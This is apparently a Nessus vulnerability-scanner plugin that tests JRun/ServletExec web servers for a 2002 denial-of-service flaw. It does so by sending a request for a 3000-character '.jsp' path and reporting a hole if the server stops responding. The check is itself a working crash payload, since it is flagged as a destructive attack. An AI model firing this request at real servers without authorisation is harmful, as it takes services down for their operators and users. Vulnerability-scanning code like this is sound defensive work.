#
# This script was written by Matt Moore <matt.moore@westpoint.ltd.uk>
#
# Script audit and contributions from Carmichael Security
#      Erik Anderson <eanders@carmichaelsecurity.com> (nb: domain no longer exists)
#      Wrong BugtraqID(6122). Changed to BID:4796. Added CAN.
#
# See the Nessus Scripts License for details
#

# Changes by Tenable:
# - Revised plugin title, added additional OSVDB (4/3/2009)
# - Updated to use compat.inc (11/20/2009)



include("compat.inc");

if(description)
{
 script_id(10958);
 script_version ("$Revision: 1.26 $");
 script_bugtraq_id(1570, 4796);
 script_osvdb_id(1509, 8380, 8381);
 script_cve_id("CVE-2002-0894", "CVE-2000-0681");

 script_name(english:"ServletExec 4.1 / JRun ISAPI Multiple DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is prone to a denial of service attack." );
 script_set_attribute(attribute:"description", value:
"By sending an overly long request for a .jsp file, it is possible to
crash the remote web server. 

This problem is known as the ServletExec / JRun ISAPI DoS." );
 script_set_attribute(attribute:"see_also", value:"http://www.westpoint.ltd.uk/advisories/wp-02-0006.txt" );
 script_set_attribute(attribute:"solution", value:
"Download patch #9 from ftp://ftp.newatlanta.com/public/4_1/patches/" );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2002/05/22");
 script_set_attribute(attribute:"vuln_publication_date", value: "2002/05/22");
 script_cvs_date("$Date: 2016/12/14 20:22:12 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
 script_summary(english:"Tests for ServletExec 4.1 ISAPI DoS");
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2002-2016 Matt Moore");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl", "www_too_long_url.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("www/too_long_url_crash");
 exit(0);
}

# Check starts here

include("http_func.inc");
crashes_already = get_kb_item("www/too_long_url_crash");
if(crashes_already)exit(0);

port = get_http_port(default:80);

if(get_port_state(port))
{ 
 banner = get_http_banner(port:port);
 if ( ! banner ) exit(0);
 if ( "JRun" >!<  banner ) exit(0);
 
 buff = string("/", crap(3000), ".jsp");

 req = http_get(item:buff, port:port);
	      
 soc = http_open_socket(port);
 if(soc)
 {
 send(socket:soc, data:req);
 r = http_recv(socket:soc);
 if (!r)
	security_hole(port);
 
 }
}

